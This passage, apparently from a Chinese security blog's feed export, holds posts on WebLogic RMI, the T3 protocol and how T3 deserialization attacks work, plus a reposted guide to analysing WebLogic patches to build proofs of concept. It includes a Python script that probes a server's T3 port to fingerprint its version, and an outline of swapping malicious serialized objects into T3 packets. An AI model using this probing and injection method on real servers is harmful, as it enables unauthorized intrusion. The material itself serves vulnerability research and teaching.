HelloServer"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            System.err.println(<span class="string">"HelloImpl.main: an exception occurred:"</span>);</span><br><span class="line">            System.err.println(e.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>WebLogic RMI的服务端已经构建完成，客户端也不再需要<code>Stub</code>对象：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// HelloClient.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> examples.rmi.hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>{</span><br><span class="line">    <span class="comment">// Defines the JNDI context factory.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY = <span class="string">"weblogic.jndi.WLInitialContextFactory"</span>;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span> </span>{</span><br><span class="line">        System.err.println(<span class="string">"Usage: java examples.rmi.hello.HelloClient "</span> +</span><br><span class="line">                <span class="string">"&lt;hostname&gt; &lt;port number&gt;"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloClient</span><span class="params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="keyword">if</span> (argv.length &lt; <span class="number">2</span>) {</span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        String host = argv[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            port = Integer.parseInt(argv[<span class="number">1</span>]);</span><br><span class="line">        } <span class="keyword">catch</span> (NumberFormatException nfe) {</span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">throw</span> nfe;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            InitialContext ic = getInitialContext(<span class="string">"t3://"</span> + host + <span class="string">":"</span> + port);</span><br><span class="line">            IHello obj = (IHello) ic.lookup(<span class="string">"HelloServer"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Successfully connected to HelloServer on "</span> +</span><br><span class="line">                    host + <span class="string">" at port "</span> +</span><br><span class="line">                    port + <span class="string">": "</span> + obj.sayHello());</span><br><span class="line">        } <span class="keyword">catch</span> (Exception ex) {</span><br><span class="line">            System.err.println(<span class="string">"An exception occurred: "</span> + ex.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException </span>{</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最后记得项目中引入<code>wlthint3client.jar</code>这个jar包供客户端调用时可以找到<code>weblogic.jndi.WLInitialContextFactory</code>。</p>
<p>来看一下WebLogic RMI的调用流程</p>
<p><img src="/posts/914084023/image-20210622152342092.png" alt="image-20210622152342092"></p>
<p>前置知识讲完了，小结一下这些概念的关系，Java RMI即远程方法调用，默认使用JRMP协议通信。WebLogic RMI是WebLogic对Java RMI的实现，其使用T3或IIOP协议作为通信协议。无论是Java RMI还是WebLogic RMI，都需要使用JNDI去发现远端的RMI服务。</p>
<p><img src="/posts/914084023/image-20210622152514752.png" alt="image-20210622152514752"></p>
<h4 id="T3协议及反序列化漏洞"><a href="#T3协议及反序列化漏洞" class="headerlink" title="T3协议及反序列化漏洞"></a>T3协议及反序列化漏洞</h4><h5 id="T3协议简介"><a href="#T3协议简介" class="headerlink" title="T3协议简介"></a>T3协议简介</h5><p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。T3协议包括</p>
<ol>
<li>请求包头</li>
<li>请求主体</li>
</ol>
<p>因此，在T3数据包构造过程中，需要发送两部分的数据。</p>
<p><img src="/posts/914084023/2099765-20210307153843180-97941712.png" alt="2099765-20210307153843180-97941712.png"></p>
<p>我们通过部署好的环境，以及<a href="https://www.anquanke.com/post/id/219985#h3-13" target="_blank" rel="noopener">现成的payload</a>，去看看这个协议包情况</p>
<p><strong>T3协议</strong></p>
<p><img src="/posts/914084023/2099765-20210307154238105-472242707.png" alt="2099765-20210307154238105-472242707.png"></p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">t3 12.2.1</span><br><span class="line">AS:255</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line">PU:t3://us-l-breens:7001</span><br></pre></td></tr></tbody></table></figure>

<p>可以看出这是它的请求头。本文测试时发送的T3协议头为</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一行为“t3”加weblogic客户端的版本号。</span></span><br><span class="line">t3 12.2.1</span><br><span class="line">AS:255</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line">PU:t3://us-l-breens:7001</span><br></pre></td></tr></tbody></table></figure>

<p>weblogic服务器的返回数据为</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">第一行为“HELO:”加weblogic服务器的版本号</span></span><br><span class="line">HELO:10.3.6.0.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br></pre></td></tr></tbody></table></figure>

<p>weblogic客户端与服务器发送的数据均以“\n\n”结尾。</p>
<p><img src="/posts/914084023/2099765-20210307160852667-465177409.png" alt="2099765-20210307160852667-465177409.png"></p>
<p>可能会问这个地方和其他地方的T3协议怎么不一样？因为我用的exp中，它是伪造自定义了请求包的。可参考<a href="https://blog.csdn.net/weixin_45728976/article/details/105063410" target="_blank" rel="noopener">文章</a>。</p>
<p>也就是说，如何判断对方是否使用T3协议等等，可以对服务器进行发包，发送请求头，对方则会返回weblogic服务器版本<br>前人经验：使用t3 9.2.0nAS:255nHL:19nn字符串作为T3的协议头发送给weblogic9、weblogic10g、weblogic11g、weblogic12c均合法。<br>检测代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">hello = <span class="string">b't3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.settimeout(<span class="number">5</span>)</span><br><span class="line">sock.connect((<span class="string">'192.168.22.137'</span>,<span class="number">7001</span>))</span><br><span class="line">sock.send(hello)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">print(resp1)</span><br></pre></td></tr></tbody></table></figure>
<p><strong>T3攻击方式</strong></p>
<ul>
<li>第一种：将weblogic发送的java序列化数据的地2到第7部分的反序列化数据进行替换</li>
</ul>
<p><img src="/posts/914084023/2099765-20210307161834472-667120481.png" alt="2099765-20210307161834472-667120481.png"></p>
<ul>
<li>第二种：将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。也就是替换第一部分的数据</li>
</ul>
<p><img src="/posts/914084023/2099765-20210307162400442-528006101.png" alt="2099765-20210307162400442-528006101.png"></p>
<p><img src="/posts/914084023/2099765-20210307163345406-1392976202.png" alt="2099765-20210307163345406-1392976202.png"></p>
<p>以上来自网上文献：<a href="http://drops.xmd5.com/static/drops/web-13470.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-13470.html</a></p>
<h5 id="T3反序列化漏洞"><a href="#T3反序列化漏洞" class="headerlink" title="T3反序列化漏洞"></a>T3反序列化漏洞</h5><p>上面，我详细解释了WebLogic RMI的调用过程，我们初窥了一下T3协议。那么现在我们来仔细看一下刚才抓到的正常WebLogic RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是：</p>
<ul>
<li>我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）</li>
<li>每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）</li>
<li>每个数据包上面都包含了一个T3协议头</li>
<li>仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度</li>
<li>以及我们也能发现包长度后面的“01”代表请求，“02”代表返回</li>
</ul>
<p><img src="/posts/914084023/64.png" alt="64.png"></p>
<p>这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下：</p>
<p><img src="/posts/914084023/65.png" alt="65.png"></p>
<p>替换序列化对象示意图如下：</p>
<p><img src="/posts/914084023/66.png" alt="66.png"></p>
<p>剩下的事情就是找到合适的利用链了（通常也是最难的事）。</p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul>
<li><a href="https://www.cnblogs.com/0x7e/p/14529949.html" target="_blank" rel="noopener">https://www.cnblogs.com/0x7e/p/14529949.html</a></li>
<li><a href="https://www.anquanke.com/post/id/219985#h2-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219985#h2-10</a></li>
<li><a href="https://nosec.org/home/detail/2859.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2859.html</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>weblogic,T3,JNDI,RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic简介及补丁分析方法(转)</title>
    <url>/posts/4114466392/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近在对Weblogic进行研究，研究过程中需要对weblogic的基础知识有所了解，苦于自己懒又不愿意去查找官方文档以及各类参考文章去总结，为此在查阅了各类资料后，找到了几篇写的比较全的文章，可能是你能找到的最详细的WebLogic安全相关中文文档，由于文章介绍很详细，部分内容其实对自己的研究没什么影响，因此仅从中摘录了对于漏洞复现有关的内容，具体如下，如果有想查看原文的同学可以通过下方链接直达。不过介绍之前还是有必要声明该文章的来源及出处，防止侵权，在此也感谢各位前辈们在研究过程中付出的点点滴滴和共享的成果，让大家能够在研究的道路上摸清方向！</p>
<ul>
<li>WebLogic安全研究报告引用文章说明</li>
</ul>
<blockquote>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
<p>本文链接：<a href="https://nosec.org/home/detail/2859.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2859.html</a></p>
<p>来源：<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&amp;chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1565607726135&amp;sharer_shareid=37947731a17f1281ace10f1fc77146cf&amp;key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&amp;ascene=1&amp;uin=MjMwMDM5OTYzMg%3D%3D&amp;devicetype=Windows+10&amp;version=62060833&amp;lang=zh_CN&amp;pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At" target="_blank" rel="noopener">奇安信</a></p>
<p>本文版权归原作者所有，如有侵权请联系我及时删除</p>
</blockquote>
<ul>
<li>weblogic cve漏洞捡漏指南引用文章说明</li>
</ul>
<blockquote>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
<p>本文链接：<a href="https://mp.weixin.qq.com/s/HlG_Jd8zu0dR4rQw25hfDg" target="_blank" rel="noopener">weblogic cve漏洞捡漏指南</a></p>
<p>来源：<a href="https://mp.weixin.qq.com/s/HlG_Jd8zu0dR4rQw25hfDg" target="_blank" rel="noopener">宽字节安全公众号</a></p>
<p>本文版权归原作者所有，如有侵权请联系我及时删除</p>
</blockquote>
<h4 id="Oracle-WebLogic-Server"><a href="#Oracle-WebLogic-Server" class="headerlink" title="Oracle WebLogic Server"></a>Oracle WebLogic Server</h4><p>Oracle WebLogic Server（以下简称WebLogic）是一个可扩展的企业级Java平台（Java EE）应用服务器。其完整实现了Java EE 5.0规范，并且支持部署多种类型的分布式应用程序。</p>
<p>实际上WebLogic是组成Oracle融合中间件的核心。几乎所有的Oracle融合中间件产品都需要运行WebLogic Server。因此，<strong>本质上，WebLogic Server不是Oracle融合中间件，而是构建或运行Oracle融合中间件的基础，Oracle融合中间件和WebLogic密不可分，却在概念上不相等。</strong></p>
<h4 id="WebLogic的版本"><a href="#WebLogic的版本" class="headerlink" title="WebLogic的版本"></a>WebLogic的版本</h4><p>WebLogic版本众多，但是现在我们经常见到的只有两个类别：10.x和12.x，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。根据Oracle官方下载页面<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html（从下向上看）：" target="_blank" rel="noopener">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html（从下向上看）：</a></p>
<p>10.x的版本为Oracle WebLogic Server 10.3.6，这个版本也是大家用来做漏洞分析的时候最喜欢拿来用的版本。P牛的vulhub(<a href="https://github.com/vulhub/vulhub)中所有WebLogic漏洞靶场都是根据这个版本搭建的。" target="_blank" rel="noopener">https://github.com/vulhub/vulhub)中所有WebLogic漏洞靶场都是根据这个版本搭建的。</a></p>
<p>12.x的主要版本有：</p>
<ul>
<li>Oracle WebLogic Server 12.1.3</li>
<li>Oracle WebLogic Server 12.2.1</li>
<li>Oracle WebLogic Server 12.2.1.1</li>
<li>Oracle WebLogic Server 12.2.1.2</li>
<li>Oracle WebLogic Server 12.2.1.3</li>
<li>Oracle WebLogic Server 12.2.1.4</li>
</ul>
<p>值得注意的是，<strong>Oracle WebLogic Server 10.3.6支持的最低JDK版本为JDK1.6， Oracle WebLogic Server 12.1.3支持的最低JDK版本为JDK1.7，Oracle WebLogic Server 12.2.1及以上支持的最低JDK版本为JDK1.8</strong>。因此由于JDK的版本不同，尤其是反序列化漏洞的利用方式会略有不同。同时，<strong>不同的Oracle WebLogic Server版本依赖的组件(jar包)也不尽相同，因此不同的WebLogic版本在反序列化漏洞的利用上可能需要使用不同的Gadget链（反序列化漏洞的利用链条）。</strong>但这些技巧性的东西不是本文的重点，请参考其他文章。如果出现一些PoC在某些时候可以利用，某些时候利用不成功的情况，应考虑到这两点。</p>
<h4 id="WebLogic的安装"><a href="#WebLogic的安装" class="headerlink" title="WebLogic的安装"></a>WebLogic的安装</h4><p>对于weblogic的安装，因为直接打包为了jar包文件，因此支持跨平台安装，既支持在windows上安装，也支持在linux下安装，windows的安装过程直接图形化界面安装即可，网上也有很多的参考资料，自行查阅相关资料即可安装；对于Linux操作系统，推荐使用WebLogic环境搭建工具，工具地址：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment，也可参考我的博文" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment，也可参考我的博文</a> <a href="https://functfan.github.io/posts/2831946175/">weblogic环境部署与远程调试</a> 快速搭建和开启远程调试。</p>
<h4 id="WebLogic漏洞分类"><a href="#WebLogic漏洞分类" class="headerlink" title="WebLogic漏洞分类"></a>WebLogic漏洞分类</h4><p>WebLogic爆出的漏洞以反序列化为主，通常反序列化漏洞也最为严重，官方漏洞评分通常达到9.8。WebLogic反序列化漏洞又可以分为xmlDecoder反序列化漏洞和T3反序列化漏洞。其他漏洞诸如任意文件上传、XXE等等也时有出现。</p>
<h4 id="WebLogic安全补丁"><a href="#WebLogic安全补丁" class="headerlink" title="WebLogic安全补丁"></a>WebLogic安全补丁</h4><p>WebLogic安全补丁通常发布在Oracle关键补丁程序更新、安全警报和公告 (<a href="https://www.oracle.com/technetwork/topics/security/alerts-086861.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/topics/security/alerts-086861.html</a>) 页面中。其中分为关键补丁程序更新（CPU）和安全警报（Oracle Security Alert Advisory）。</p>
<p>关键补丁程序更新为Oracle每个季度初定期发布的更新，通常发布时间为每年1月、4月、7月和10月。安全警报通常为漏洞爆出但距离关键补丁程序更新发布时间较长，临时通过安全警报的方式发布补丁。</p>
<p>所有补丁的下载均需要Oracle客户支持识别码，也就是只有真正购买了Oracle的产品才能下载。</p>
<p><img src="/posts/4114466392/image-20210622100143458.png" alt="image-20210622100143458"></p>
<h5 id="weblogic-补丁分析指南"><a href="#weblogic-补丁分析指南" class="headerlink" title="weblogic 补丁分析指南"></a>weblogic 补丁分析指南</h5><h6 id="1-1-Opatch"><a href="#1-1-Opatch" class="headerlink" title="1.1 Opatch"></a>1.1 Opatch</h6><p>在你挖到漏洞后，最好安装weblogic的最新补丁来校验一下你的exp是否在最新补丁下生效。weblogic使用Opatch来管理补丁。在某些补丁中，补丁包对于Opatch最小版本是有要求，这时候我们需要升级Opatch补丁号为 <code>[28186730: OPATCH 13.9.4.2.4 FOR FMW/WLS 12.2.1.3.0, 12.2.1.4.0 AND 14.1.1.0.0]</code>来解决这个问题</p>
<p><img src="/posts/4114466392/image-20210622094713089.png" alt="image-20210622094713089"></p>
<p><a href="https://support.oracle.com/epmos/faces/PatchHome?_adf.ctrl-state=1cdjuh74ay_4&amp;_afrLoop=92240149765348#" target="_blank" rel="noopener">https://support.oracle.com/epmos/faces/PatchHome?_adf.ctrl-state=1cdjuh74ay_4&amp;_afrLoop=92240149765348#</a></p>
<p>下载后，解压至任意文件夹 Windows 执行下面的命令</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">java -jar opatch_generic.jar -J-Doracle.installer.oh_admin_acl=true -silent oracle_home=&lt;ORACLE_HOME_LOCATION&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>其它系统执行下面的命令</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">java -jar &lt;PATCH_HOME&gt;/6880880/opatch_generic.jar -silent oracle_home=&lt;ORACLE_HOME_LOCATION&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>有不懂的，看压缩包里的Readme</p>
<h6 id="1-2-Opatch-打补丁"><a href="#1-2-Opatch-打补丁" class="headerlink" title="1.2 Opatch 打补丁"></a>1.2 Opatch 打补丁</h6><p>下载补丁后，解压至任意文件夹即可 </p>
<p>在Oracle_home 安装目录中，找到Opatch文件夹，执行升级操作即可 Opatch apply 补丁解压的文件夹（注意是最内层文件夹)</p>
<p><img src="/posts/4114466392/image-20210622094757336.png" alt="image-20210622094757336"></p>
<h6 id="1-3-下载补丁-需要CSI"><a href="#1-3-下载补丁-需要CSI" class="headerlink" title="1.3 下载补丁(需要CSI)"></a>1.3 下载补丁(需要CSI)</h6><p>我们只关心安全补丁，下面说下怎么下载补丁 </p>
<p>登录Oracle support网站，找到Patchs&amp;Updates 栏目，点击进去</p>
<p><img src="/posts/4114466392/image-20210622094917345.png" alt="image-20210622094917345"></p>
<p>查询条件，自己根据需要构造即可</p>
<p><img src="/posts/4114466392/image-20210622100858004.png" alt="image-20210622100858004"></p>
<p>REC的补丁，并且被标记为security，且Generic Platform平台，即是补丁</p>
<p>注意，oracle每年发布四次安全补丁，安全补丁可以跨版本打，也就是说，老补丁同时也集成在新补丁中，这点一定注意。</p>
<h5 id="weblogic-补丁分析方法"><a href="#weblogic-补丁分析方法" class="headerlink" title="weblogic 补丁分析方法"></a>weblogic 补丁分析方法</h5><p>weblogic中的补丁，其实是一个个编译好的class文件，我们直接使用idea打开补丁文件夹，就可以利用idea的反编译功能区分析补丁。</p>
<p>补丁中，每个class文件，都对应weblogic 实际目录中的一个class文件，打补丁你可以认为强行替换weblogic 中相关jar包中的class文件。</p>
<p>下面讲一下分析要点。对于这种安全补丁中，只有关于weblogic自身的安全问题，才会在这里体现，一般第三方包的安全漏洞，不会在该补丁中。</p>
<h6 id="1-1-weblogic-黑名单"><a href="#1-1-weblogic-黑名单" class="headerlink" title="1.1 weblogic 黑名单"></a>1.1 weblogic 黑名单</h6><p>直接看<code>files\oracle.wls.jrf.tenancy.common.sharedlib\12.2.1.4.0\wls.common.symbol\modules\com.bea.core.utils.jar\weblogic\utils\io</code> 文件夹下的<code>WeblogicFilterConfig.class</code> 文件</p>
<p>因为weblogic 的漏洞，绝大多数都是T3协议、IIOP协议的java反序列化漏洞。而weblogic为了修复该漏洞，最简单的办法是设置反序列化黑名单并添加黑名单列表。如果反序列化时遇到的类存在于黑名单中，则中止反序列化过程。</p>
<p>我们只需要diff黑名单列表，自己研究构造poc即可。有的时候不一定是rce，也有可能是其他问题。</p>
<h6 id="1-2-其他反序列化类"><a href="#1-2-其他反序列化类" class="headerlink" title="1.2 其他反序列化类"></a>1.2 其他反序列化类</h6><p>如果触发反序列化的类在正常业务中可能需要，或者因为其他原因不能屏蔽，weblogic的修复方法为直接修改相关的类。</p>
<p>如果一个类在readObject方法中，自己私自调用ObjectInputStream去执行反序列化操作而不是用weblogic提供的FilterInputStream执行反序列化操作，这样的话会导致weblogic的黑名单失效。这也就是反序列化中的反序列化漏洞，这种漏洞在weblogic中挺常见的。（不限于T3协议)<br>我们diff中，可以明显发现weblogic的补丁将ObjectInputStream更改为FilterInputStream。在weblogic中，只有FilterInputStream才会在反序列化的流程中检查黑名单类。<br>然后，我们根据这个类中的参数，自己构造一个类即可。<br>在idea中，覆盖一个类最简单的办法是，在自己的项目中创建一个与被覆盖的类包名相同类名相同的类，然后修改你想要修改的代码即可。例如在这个反序列化中，我要修改<code>writeExternal</code>方法。直接强行替换成cve-2020-2555的gadget。</p>
<h6 id="1-3-T3反序列化-XXE"><a href="#1-3-T3反序列化-XXE" class="headerlink" title="1.3 T3反序列化 XXE"></a>1.3 T3反序列化 XXE</h6><p>一般情况下该类漏洞都是在继承自Exterinalizable的类 中，在自定义序列过程时，将类的某些字段，作为XML去存储在反序列化的信息中。反序列化时候，读取序列化信息中相关的字符串作为XML去解析。解析的过程中没有考虑到XXE攻击。这次我捡漏的cve就是该类型的漏洞。</p>
<h4 id="Java序列化、反序列化和反序列化漏洞的概念"><a href="#Java序列化、反序列化和反序列化漏洞的概念" class="headerlink" title="Java序列化、反序列化和反序列化漏洞的概念"></a>Java序列化、反序列化和反序列化漏洞的概念</h4><p>关于Java序列化、反序列化和反序列化漏洞的概念，可参考@gyyyy写的一遍非常详细的文章：《浅析Java序列化和反序列化》(<a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)。这篇文章对这些概念做了详细的阐述和分析。我这里只引用一段话来简要说明Java反序列化漏洞的成因：" target="_blank" rel="noopener">https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)。这篇文章对这些概念做了详细的阐述和分析。我这里只引用一段话来简要说明Java反序列化漏洞的成因：</a></p>
<blockquote>
<p>当服务端允许接收远端数据进行反序列化时，客户端可以提供任意一个服务端存在的目标类的对象 （包括依赖包中的类的对象） 的序列化二进制串，由服务端反序列化成相应对象。如果该对象是由攻击者『精心构造』的恶意对象，而它自定义的readobject()中存在着一些『不安全』的逻辑，那么在对它反序列化时就有可能出现安全问题。</p>
</blockquote>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul>
<li><a href="https://nosec.org/home/detail/2859.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2859.html</a></li>
<li><a href="https://mp.weixin.qq.com/s/HlG_Jd8zu0dR4rQw25hfDg" target="_blank" rel="noopener">weblogic cve漏洞捡漏指南 (qq.com)</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&amp;chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1565607726135&amp;sharer_shareid=37947731a17f1281ace10f1fc77146cf&amp;key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&amp;ascene=1&amp;uin=MjMwMDM5OTYzMg%3D%3D&amp;devicetype=Windows+10&amp;version=62060833&amp;lang=zh_CN&amp;pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247485058&amp;idx=1&amp;sn=d22b310acf703a32d938a7087c8e8704&amp;chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1565607726135&amp;sharer_shareid=37947731a17f1281ace10f1fc77146cf&amp;key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&amp;ascene=1&amp;uin=MjMwMDM5OTYzMg%3D%3D&amp;devicetype=Windows+10&amp;version=62060833&amp;lang=zh_CN&amp;pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At</a></li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>weblogic,补丁分析,序列化与反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2015-4852-Weblogic反序列化漏洞复现与分析</title>
    <url>/posts/754158022/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

